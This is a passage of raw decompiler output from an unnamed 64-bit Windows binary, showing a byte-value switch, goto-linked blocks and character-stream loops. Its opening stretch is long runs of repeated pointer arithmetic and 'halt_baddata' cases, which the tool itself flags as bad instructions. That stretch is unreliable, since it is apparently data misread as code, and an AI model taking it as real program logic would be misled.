pcVar21[0x140115f] = pcVar21[0x140115f] + uVar26;\n            *pcVar21 = *pcVar21 + uVar5;\n            puVar1 = pcVar21 + 0x43;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar5;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + iVar11 + CARRY1(uVar32, uVar5);\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            puVar1 = pcVar21 + 0x21;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar5;\n            *(pcVar21 + 1) = *(pcVar21 + 1) + iVar11 + CARRY1(uVar32, uVar5);\n            *pcVar21 = *pcVar21 + uVar5;\n            *puVar27 = *puVar27 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            *pcVar21 = *pcVar21 + uVar5;\n            uVar4 = uVar5 + uVar24;\n            puVar22 = uVar14 | uVar4;\n            iVar11 = puVar22;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar5, uVar24);\n            *puVar22 = *puVar22 + uVar4;\n            *puVar27 = *puVar27 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            *puVar22 = *puVar22 + uVar4;\n            uVar32 = *puVar22;\n            *puVar22 = *puVar22 + 0xbd;\n            iVar15 = CONCAT71(StackY567, uStackY568);\n            piVar31 = &stack0xfffffffffffffdd0;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + (0x42 < uVar32);\n            *puVar22 = *puVar22 + uVar4;\n            puVar1 = puVar22 + 0x43;\n            uVar32 = *puVar1;\n            *puVar1 = *puVar1 + uVar24;\n            *(puVar22 + 1) = *(puVar22 + 1) + iVar11 + CARRY1(uVar32, uVar24);\n            *puVar22 = *puVar22 + uVar4;\n            uVar4 = uVar4 + uVar26;\n            piVar23 = uVar14 | uVar4;\n            uVar42 = *ppauVar25;\n            iVar11 = piVar23;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            uVar28 = ppauVar29;\n            *(iVar15 + 0x11) = *(iVar15 + 0x11) ^ uVar28;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            *(ppauVar29 + 0x11) = *(ppauVar29 + 0x11) + 0x40;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            LOCK();\n            uVar42 = puVar27 & uVar42 & *ppauVar25;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *(iVar15 + 0x11) = *(iVar15 + 0x11) ^ uVar28;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            uVar33 = *0x1000000001401143;\n            piVar23 = uVar14 | uVar33 & 0xffffffffffffff11;\n            iVar11 = piVar23;\n            *piVar23 = *piVar23 + iVar11;\n            uVar4 = uVar33 & 0xffffffffffffff11;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *(iVar15 + 0x11) = *(iVar15 + 0x11) ^ uVar28;\n            *piVar23 = *piVar23 + iVar11;\n            uVar32 = *piVar23;\n            *piVar23 = *piVar23 + uVar4;\n            uVar5 = uVar42;\n            uVar26 = uVar42 >> 8;\n            if (ppauVar25 == 0x1 || *piVar23 == 0) {\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar4);\n                *piVar23 = *piVar23 + uVar4;\n                piVar2 = piVar23 + 9;\n                uVar32 = *piVar2;\n                *piVar2 = *piVar2 + uVar5;\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar5);\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                uVar32 = *piVar23;\n                *piVar23 = *piVar23 + uVar26;\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar26);\n                *piVar23 = *piVar23 + uVar4;\n                uVar32 = *piVar23;\n                *piVar23 = *piVar23 + uVar24;\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar17 + CARRY1(uVar32, uVar24);\n                *piVar23 = *piVar23 + uVar4;\n                *(piVar23 + 0x500449) = *(piVar23 + 0x500449) + uVar5;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                *piVar23 = *piVar23 + uVar4;\n                uVar32 = *piVar23;\n                *piVar23 = *piVar23 + uVar26;\n                piVar31 = &stack0xfffffffffffffde0;\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar26);\n                *piVar23 = *piVar23 + uVar4;\n                piVar2 = piVar23 + 0x11;\n                uVar32 = *piVar2;\n                *piVar2 = *piVar2 + uVar24;\n                *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar24);\n            }\n            *piVar23 = *piVar23 + uVar4;\n            *(piVar23 + 0x500449) = *(piVar23 + 0x500449) + uVar26;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            uVar32 = *piVar23;\n            *piVar23 = *piVar23 + uVar26;\n            iVar15 = *piVar31;\n            *(piVar23 + 1) = *(piVar23 + 1) + iVar11 + CARRY1(uVar32, uVar26);\n            *piVar23 = *piVar23 + uVar4;\n            *(piVar23 + 0x500451) = *(piVar23 + 0x500451) + uVar24;\n            *piVar23 = *piVar23 + uVar4;\n            uVar33 = uVar4 + uVar5 & 0xffffffffffffff11;\n            piVar23 = uVar14 | uVar33;\n            iVar11 = piVar23;\n            *piVar23 = *piVar23 + iVar11;\n            uVar4 = uVar33;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            puVar1 = iVar15 + 0x11;\n            *puVar1 = *puVar1 ^ uVar28;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n            *(ppauVar12 + 0x11) = *(ppauVar12 + 0x11) + uVar4;\n            *piVar23 = *piVar23 + iVar11;\n            uVar32 = *piVar23;\n            *piVar23 = *piVar23 + uVar4;\n            *0x140126357 = *0x140126357 + uVar24 + CARRY1(uVar32, uVar4);\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            *piVar23 = *piVar23 + uVar4;\n            puVar1 = iVar15 + 0x11;\n            *puVar1 = *puVar1 ^ uVar28;\n            *piVar23 = *piVar23 + iVar11;\n            *piVar23 = *piVar23 + uVar4;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe0:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe1:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe2:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe3:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe4:\n            goto code_r0x00014010bde0;\n        case 0xe8:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xe9:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        case 0xf2:\n        case 0xf7:\n        case 0xf8:\n            goto code_r0x00014000a2e0;\n        case 0xf3:\n        case 0xfa:\n            return arg1_01;\n        case 0xf4:\n        case 0xf6:\n            *ppauVar25 = *ppauVar25 - 1;\n            return arg1_01;\n        case 0xf5:\n            uStackY576 = 0x14000a34f;\n            fcn.1400aa2e0(ppauVar12 + 0x4ca);\n            uStackY576 = 0x14000a363;\n            fcn.1400aa2e0(ppauVar12 + 0x4ce);\n            uStackY576 = 0x14000a377;\n            fcn.1400aa2e0(ppauVar12 + 0x4d2);\n            uStackY576 = 0x14000a38b;\n            fcn.1400aa2e0(ppauVar12 + 0x4d6);\n            uStackY576 = 0x14000a39f;\n            fcn.1400aa2e0(ppauVar12 + 0x4da);\n            uStackY576 = 0x14000a3b3;\n            fcn.1400aa2e0(ppauVar12 + 0x4de);\n            uStackY576 = 0x14000a3c7;\n            fcn.1400aa2e0(ppauVar12 + 0x4e2);\n            uStackY576 = 0x14000a3db;\n            fcn.1400aa2e0(ppauVar12 + 0x4e6);\n            uStackY576 = 0x14000a3ef;\n            fcn.1400aa2e0(ppauVar12 + 0x4ea);\n            uStackY576 = 0x14000a403;\n            fcn.1400aa2e0(ppauVar12 + 0x4ee);\n            uStackY576 = 0x14000a417;\n            fcn.1400aa2e0(ppauVar12 + 0x4f2);\n            uStackY576 = 0x14000a42b;\n            fcn.1400aa2e0(ppauVar12 + 0x4f6);\n            uStackY576 = 0x14000a43f;\n            fcn.140072290(ppauVar12 + 0x27df);\n            goto code_r0x00014000a5af;\n        case 0xf9:\n            arg1_00 = ppauVar12 + 0x4b0;\n            ppauVar29 = arg1_01;\n            goto code_r0x00014000a2e0;\n        case 0xfb:\n            *arg1_01 = *arg1_01 + uVar4;\n            uStackY576 = 0x14000a661;\n            ppauVar12 = fcn.14000a5f2(1, 0x14010bd78);\n            return ppauVar12;\n        case 0xfc:\n        case 0xfd:\n        case 0xfe:\n            *arg1_01 = *arg1_01 + iVar10;\n            *arg1_01 = *arg1_01 + uVar4;\n            return NULL;\n        case 0xff:\n            *(uVar33 + 0x68) = *(uVar33 + 0x68) ^ arg1_02;\n            return NULL;\n        }\ncode_r0x000140067f18:\n        piVar34 = CONCAT44(uStack404, uStack408);\ncode_r0x000140067c0d:\n        uVar33 = uVar33 + 1;\n        unaff_RSI = arg1_02;\n        in_R9 = auStack424;\n    } while( true );\ncode_r0x00014006e289:\n    if (piVar34[2] < piVar34[3]) {\n        piVar34[2] = piVar34[2] + 2;\n    }\n    else {\n        uStackY576 = 0x14006e6fe;\n        (**(*piVar34 + 0x50))(piVar34);\n    }\n    _auStack424 = CONCAT28(0xffff, auStack424);\n    bVar35 = true;\n    if (piVar34 != NULL) {\n        if (piVar34[2] < piVar34[3]) {\n            iVar6 = *piVar34[2];\n        }\n        else {\n            uStackY576 = 0x14006e9fe;\n            iVar6 = (**(*piVar34 + 0x48))(piVar34);\n        }\n        if (iVar6 == -1) {\n            _auStack424 = _auStack424 & 0xffffffffffffffff;\n        }\n        bVar35 = iVar6 == -1;\n    }\n    bVar37 = iStack432 == -1;\n    piVar34 = SUB168(auStack440_00, 0);\n    if ((piVar34 != NULL) && (bVar37)) {\n        if (piVar34[2] < piVar34[3]) {\n            iVar6 = *piVar34[2];\n        }\n        else {\n            uStackY576 = 0x14006ea09;\n            iVar6 = (**(*piVar34 + 0x48))();\n        }\n        if (iVar6 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar37 = iVar6 == -1;\n    }\n    if (bVar37 == bVar35) goto code_r0x00014006dc7c;\n    if (auStack424 != NULL) {\n        if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n            iVar6 = **(auStack424 + 0x10);\n        }\n        else {\n            uStackY576 = 0x14006ea14;\n            iVar6 = (**(*auStack424 + 0x48))();\n        }\n        if (iVar6 == -1) {\n            _auStack424 = _auStack424 & 0xffffffffffffffff;\n        }\n    }\n    uStackY576 = 0x14006e279;\n    cVar3 = (**(**noname_11 + 0x10))();\n    if (cVar3 == '\\0') goto code_r0x00014006dc7c;\n    piVar34 = auStack424;\n    goto code_r0x00014006e289;\ncode_r0x00014006eb6c:\n    if (arg1_01 == NULL) {\n        uVar19 = SUB168(in_stack_fffffffffffffe38 >> 0x40, 0);\n    }\n    else {\n        uVar19 = SUB168(CONCAT115(*(iVar15 + 0x50) != 0, SUB1615(in_stack_fffffffffffffe38, 0)) >> 0x40, 0);\n    }\n    arg1_02 = &stack0xfffffffffffffe80;\n    uStackY576 = 0x14006eb90;\n    uVar18 = fcn.14007b890(0, 0);\n    uStack392 = uVar18;\n    uStack388 = uVar18 >> 0x20;\n    if (*(iVar15 + 0x20) != '\\0') {\n        uStackY576 = 0x14006ebb1;\n        fcn.14007d790(&stack0xfffffffffffffe78, 0x20);\n    }\ncode_r0x00014006ebb1:\n    auVar40 = CONCAT88(uVar19, &stack0xfffffffffffffe73);\n    uStackY576 = 0x14006ebca;\n    uVar19 = fcn.14007b890(0, 0);\n    uStack384 = uVar19;\n    uStack382 = uVar19 >> 0x10;\n    uStack380 = uVar19 >> 0x20;\n    uStackY576 = 0x14006ebdf;\n    fcn.14007d790(arg1_02, 0x20);\n    ppauVar29 = NULL;\n    uStack396 = *(iVar15 + 0x60);\n    in_stack_fffffffffffffe08 = NULL;\n    arg_70h = &stack0xfffffffffffffe74;\n    uVar14 = 0;\n    in_stack_fffffffffffffe38 =\n         CONCAT115(SUB161(auVar40 >> 0x78, 0), \n                   ZEXT1415(SUB1614(CONCAT412(SUB164(CONCAT214(SUB162(auVar40 >> 0x70, 0), ZEXT1314(SUB1613(auVar40, 0))\n                                                              ) >> 0x60, 0), ZEXT812(SUB168(auVar40, 0))), 0)));\n    goto code_r0x00014006ec32;\ncode_r0x00014010bde0:\n    *0x11510b339 = *0x11510b339 + 1;\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\ncode_r0x00014000a2e0:\n    arg1_01 = ppauVar29;\n    uStackY576 = 0x14000a2e8;\n    fcn.1400aa2e0(arg1_00);\n    uStackY576 = 0x14000a2fc;\n    fcn.1400aa2e0(ppauVar12 + 0x4b4);\n    uStackY576 = 0x14000a310;\n    fcn.1400aa2e0(ppauVar12 + 0x4b8);\n    uStackY576 = 0x14000a324;\n    fcn.1400aa2e0(ppauVar12 + 0x4bc);\n    uStackY576 = 0x14000a338;\n    fcn.140072290(ppauVar12 + 0x260f);\ncode_r0x00014000a5af:\n    uStackY576 = 0x14000a5be;\n    fcn.1400aa2e0(ppauVar12 + 0x3a);\n    uStackY576 = 0x14000a5c9;\n    ppauVar12 = fcn.140014f30(arg1_01);\n    return ppauVar12;\ncode_r0x00014006dc7c:\n    while( true ) {\n        iVar11 = in_stack_fffffffffffffe08;\n        in_stack_fffffffffffffe08 = in_stack_fffffffffffffe08 + 1;\n        uVar32 = in_stack_fffffffffffffdf8 >> 0x20;\n        if ((uVar32 & iVar11 + 1 < 4) == 0) break;\ncode_r0x00014006dc22:\n        if (arg_70h[in_stack_fffffffffffffe08] < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006dc48. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppauVar12 = (*(*(arg_70h[in_stack_fffffffffffffe08] * 4 + 0x14010bee0) + 0x14010bee0))();\n            return ppauVar12;\n        }\n        in_stack_fffffffffffffdf8 = 0x100000000;\n    }\n    if ((1 < uVar14 & uVar32) == 0) {\n        if (uVar32 != 0) {\n            uVar14 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\njoined_r0x00014006e970:\n            if (1 < uVar14) {\n                uStackY576 = 0x14006e752;\n                uVar14 = fcn.140024dd0(arg1_02, 0x30, 0);\n                if (uVar14 != 0) {\n                    uVar33 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n                    if (uVar14 == 0xffffffffffffffff) {\n                        uVar14 = uVar33 - 1;\n                    }\n                    if (uVar14 <= uVar33) {\n                        uVar33 = uVar14;\n                    }\n                    uStackY576 = 0x14006e787;\n                    fcn.14007d8a0(arg1_02, 0, uVar33, 0);\n                }\n            }\n            if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) != '\\0') {\n                pcVar21 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                if (-1 < *(pcVar21 + -8)) {\n                    uStackY576 = 0x14006ea59;\n                    fcn.14007b820(arg1_02);\n                    pcVar21 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                }\n                if (*pcVar21 != '0') {\n                    if (-1 < *(pcVar21 + -8)) {\n                        uStackY576 = 0x14006ea4c;\n                        fcn.14007b820(arg1_02);\n                    }\n                    uStackY576 = 0x14006e9bd;\n                    fcn.14007bd00(arg1_02, 0, 0, 1);\n                    *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack388, uStack392) + -0x18) != 0) {\n                cVar3 = ppauVar29;\n                if (SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) != '\\0') {\n                    cVar3 = SUB161(in_stack_fffffffffffffe38 >> 0x40, 0);\n                }\n                uStackY576 = 0x14006e5eb;\n                fcn.14007da40(&stack0xfffffffffffffe78, cVar3);\n                uStackY576 = 0x14006e5fb;\n                cVar3 = fcn.1400b76a0(*(iVar15 + 0x10), *(iVar15 + 0x18), &stack0xfffffffffffffe78);\n                if (cVar3 == '\\0') {\n                    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\n                }\n            }\n            if ((SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) == '\\0') || (*(iVar15 + 0x58) == ppauVar29)) {\n                uStackY576 = 0x14006e62b;\n                fcn.14007c220(CONCAT44(uStack244, uStack248), arg1_02);\n                goto code_r0x00014006e10e;\n            }\n        }\n    }\n    else {\n        if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) == '\\0') {\n            iVar17 = *(iVar15 + 0x38);\n        }\n        else {\n            iVar17 = *(iVar15 + 0x48);\n        }\n        uVar33 = 1;\n        piVar34 = auStack424;\n        while( true ) {\n            bVar37 = uStack416 == -1;\n            bVar35 = bVar37;\n            if ((piVar34 != NULL) && (bVar37)) {\n                if (piVar34[2] < piVar34[3]) {\n                    iVar6 = *piVar34[2];\n                }\n                else {\n                    uStackY576 = 0x14006e9ef;\n                    iVar6 = (**(*piVar34 + 0x48))(piVar34);\n                }\n                if (iVar6 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n                bVar35 = iVar6 == -1;\n            }\n            bVar38 = iStack432 == -1;\n            piVar34 = SUB168(auStack440_00, 0);\n            if ((piVar34 != NULL) && (bVar38)) break;\n            if (uVar14 <= uVar33) goto code_r0x00014006e590;\ncode_r0x00014006ddc4:\n            if (bVar38 == bVar35) goto code_r0x00014006e590;\n            if ((auStack424 != NULL) && (bVar37)) {\n                if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                    uStack416._0_2_ = **(auStack424 + 0x10);\n                }\n                else {\n                    uStackY576 = 0x14006ea22;\n                    uStack416._0_2_ = (**(*auStack424 + 0x48))();\n                }\n                if (uStack416 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n            }\n            if (*(iVar17 + uVar33 * 2) != uStack416) goto code_r0x00014006e103;\n            piVar34 = auStack424;\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n            }\n            else {\n                uStackY576 = 0x14006e70c;\n                (**(*auStack424 + 0x50))(auStack424);\n            }\n            uVar33 = uVar33 + 1;\n            uStack416._0_2_ = -1;\n            _auStack424 = CONCAT28(0xffff, auStack424);\n        }\n        if (piVar34[2] < piVar34[3]) {\n            iVar6 = *piVar34[2];\n        }\n        else {\n            uStackY576 = 0x14006e9e1;\n            iVar6 = (**(*piVar34 + 0x48))();\n        }\n        if (iVar6 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar38 = iVar6 == -1;\n        if (uVar33 < uVar14) goto code_r0x00014006ddc4;\ncode_r0x00014006e590:\n        if (uVar33 == uVar14) {\n            uVar14 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n            goto joined_r0x00014006e970;\n        }\n    }\ncode_r0x00014006e103:\n    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\ncode_r0x00014006e10e:\n    uStackY576 = 0x14006e123;\n    cVar3 = fcn.140029ee0(&stack0xfffffffffffffe58, &stack0xfffffffffffffe48);\n    if (cVar3 != '\\0') {\n        *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 2;\n    }\n    *ppauStack296 = auStack424._0_4_;\n    *(ppauStack296 + 4) = auStack424._4_4_;\n    *(ppauStack296 + 1) = uStack416;\n    *(ppauStack296 + 0xc) = uStack416._4_4_;\n    uStackY576 = 0x14006e15c;\n    fcn.14007bf20(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n    uStackY576 = 0x14006e170;\n    fcn.14007bf20(CONCAT44(uStack388, uStack392) + -0x18);\n    return ppauStack296;\ncode_r0x00014006f2ab:\n    *0x14010bd78 = *0x14010bd78 << 1 | *0x14010bd78 >> 7;\n    piVar34 = in_stack_00000040 + iVar15;\n    iStackY552 = iVar10;\n    while( true ) {\n        _auStack424 = CONCAT28(0xffff, auStack424);\n        bVar35 = true;\n        if (piVar34 != NULL) {\n            if (piVar34[2] < piVar34[3]) {\n                iVar6 = *piVar34[2];\n            }\n            else {\n                uStackY576 = 0x14006fa0e;\n                iVar6 = (**(*piVar34 + 0x48))(piVar34);\n            }\n            if (iVar6 == -1) {\n                _auStack424 = _auStack424 & 0xffffffffffffffff;\n            }\n            bVar35 = iVar6 == -1;\n        }\n        bVar37 = iStack432 == -1;\n        piVar34 = SUB168(auStack440_00, 0);\n        if ((piVar34 != NULL) && (bVar37)) {\n            if (piVar34[2] < piVar34[3]) {\n                iVar6 = *piVar34[2];\n            }\n            else {\n                uStackY576 = 0x14006fa19;\n                iVar6 = (**(*piVar34 + 0x48))();\n            }\n            if (iVar6 == -1) {\n                auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n            }\n            bVar37 = iVar6 == -1;\n        }\n        if (bVar37 == bVar35) break;\n        if (auStack424 != NULL) {\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                iVar6 = **(auStack424 + 0x10);\n            }\n            else {\n                uStackY576 = 0x14006fa24;\n                iVar6 = (**(*auStack424 + 0x48))();\n            }\n            if (iVar6 == -1) {\n                _auStack424 = _auStack424 & 0xffffffffffffffff;\n            }\n        }\n        uStackY576 = 0x14006f289;\n        cVar3 = (**(**noname_11 + 0x10))();\n        if (cVar3 == '\\0') break;\n        piVar34 = auStack424;\n        if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n            *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n        }\n        else {\n            uStackY576 = 0x14006f70e;\n            (**(*auStack424 + 0x50))(auStack424);\n        }\n    }\n    while( true ) {\n        iVar11 = in_stack_fffffffffffffe08;\n        in_stack_fffffffffffffe08 = in_stack_fffffffffffffe08 + 1;\n        uVar32 = in_stack_fffffffffffffdf8 >> 0x20;\n        if ((uVar32 & iVar11 + 1 < 4) == 0) break;\ncode_r0x00014006ec32:\n        if (arg_70h[in_stack_fffffffffffffe08] < 5) {\n    // WARNING: Could not recover jumptable at 0x00014006ec58. Too many branches\n    // WARNING: Treating indirect jump as call\n            ppauVar12 = (*(*(arg_70h[in_stack_fffffffffffffe08] * 4 + 0x14010becc) + 0x14010becc))();\n            return ppauVar12;\n        }\n        in_stack_fffffffffffffdf8 = 0x100000000;\n    }\n    if ((1 < uVar14 & uVar32) == 0) {\n        if (uVar32 != 0) {\n            uVar14 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\njoined_r0x00014006f980:\n            if (1 < uVar14) {\n                uStackY576 = 0x14006f762;\n                uVar14 = fcn.140024dd0(arg1_02, 0x30, 0);\n                if (uVar14 != 0) {\n                    uVar33 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n                    if (uVar14 == 0xffffffffffffffff) {\n                        uVar14 = uVar33 - 1;\n                    }\n                    if (uVar14 <= uVar33) {\n                        uVar33 = uVar14;\n                    }\n                    uStackY576 = 0x14006f797;\n                    fcn.14007d8a0(arg1_02, 0, uVar33, 0);\n                }\n            }\n            if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) != '\\0') {\n                pcVar21 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                if (-1 < *(pcVar21 + -8)) {\n                    uStackY576 = 0x14006fa69;\n                    fcn.14007b820(arg1_02);\n                    pcVar21 = CONCAT44(uStack380, CONCAT22(uStack382, uStack384));\n                }\n                if (*pcVar21 != '0') {\n                    if (-1 < *(pcVar21 + -8)) {\n                        uStackY576 = 0x14006fa5c;\n                        fcn.14007b820(arg1_02);\n                    }\n                    uStackY576 = 0x14006f9cd;\n                    fcn.14007bd00(arg1_02, 0, 0, 1);\n                    *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -8) = 0xffffffff;\n                }\n            }\n            if (*(CONCAT44(uStack388, uStack392) + -0x18) != 0) {\n                cVar3 = ppauVar29;\n                if (SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) != '\\0') {\n                    cVar3 = SUB161(in_stack_fffffffffffffe38 >> 0x40, 0);\n                }\n                uStackY576 = 0x14006f5fb;\n                fcn.14007da40(&stack0xfffffffffffffe78, cVar3);\n                uStackY576 = 0x14006f60b;\n                cVar3 = fcn.1400b76a0(*(iVar15 + 0x10), *(iVar15 + 0x18), &stack0xfffffffffffffe78);\n                if (cVar3 == '\\0') {\n                    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\n                }\n            }\n            if ((SUB161(in_stack_fffffffffffffe38 >> 0x68, 0) == '\\0') || (*(iVar15 + 0x58) == ppauVar29)) {\n                uStackY576 = 0x14006f63b;\n                fcn.14007c220(CONCAT44(uStack244, uStack248), arg1_02);\n                goto code_r0x00014006f11e;\n            }\n        }\n    }\n    else {\n        if (SUB161(in_stack_fffffffffffffe38 >> 0x70, 0) == '\\0') {\n            iVar17 = *(iVar15 + 0x38);\n        }\n        else {\n            iVar17 = *(iVar15 + 0x48);\n        }\n        uVar33 = 1;\n        piVar34 = auStack424;\n        while( true ) {\n            bVar37 = uStack416 == -1;\n            bVar35 = bVar37;\n            if ((piVar34 != NULL) && (bVar37)) {\n                if (piVar34[2] < piVar34[3]) {\n                    iVar6 = *piVar34[2];\n                }\n                else {\n                    uStackY576 = 0x14006f9ff;\n                    iVar6 = (**(*piVar34 + 0x48))(piVar34);\n                }\n                if (iVar6 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n                bVar35 = iVar6 == -1;\n            }\n            bVar38 = iStack432 == -1;\n            piVar34 = SUB168(auStack440_00, 0);\n            if ((piVar34 != NULL) && (bVar38)) break;\n            if (uVar14 <= uVar33) goto code_r0x00014006f5a0;\ncode_r0x00014006edd4:\n            if (bVar38 == bVar35) goto code_r0x00014006f5a0;\n            if ((auStack424 != NULL) && (bVar37)) {\n                if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                    uStack416._0_2_ = **(auStack424 + 0x10);\n                }\n                else {\n                    uStackY576 = 0x14006fa32;\n                    uStack416._0_2_ = (**(*auStack424 + 0x48))();\n                }\n                if (uStack416 == -1) {\n                    _auStack424 = _auStack424 & 0xffffffffffffffff;\n                }\n            }\n            if (*(iVar17 + uVar33 * 2) != uStack416) goto code_r0x00014006f113;\n            piVar34 = auStack424;\n            if (*(auStack424 + 0x10) < *(auStack424 + 0x18)) {\n                *(auStack424 + 0x10) = *(auStack424 + 0x10) + 2;\n            }\n            else {\n                uStackY576 = 0x14006f71c;\n                (**(*auStack424 + 0x50))(auStack424);\n            }\n            uVar33 = uVar33 + 1;\n            uStack416._0_2_ = -1;\n            _auStack424 = CONCAT28(0xffff, auStack424);\n        }\n        if (piVar34[2] < piVar34[3]) {\n            iVar6 = *piVar34[2];\n        }\n        else {\n            uStackY576 = 0x14006f9f1;\n            iVar6 = (**(*piVar34 + 0x48))();\n        }\n        if (iVar6 == -1) {\n            auStack440_00 = auStack440_00 & 0xffffffffffffffff;\n        }\n        bVar38 = iVar6 == -1;\n        if (uVar33 < uVar14) goto code_r0x00014006edd4;\ncode_r0x00014006f5a0:\n        if (uVar33 == uVar14) {\n            uVar14 = *(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n            goto joined_r0x00014006f980;\n        }\n    }\ncode_r0x00014006f113:\n    *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 4;\ncode_r0x00014006f11e:\n    uStackY576 = 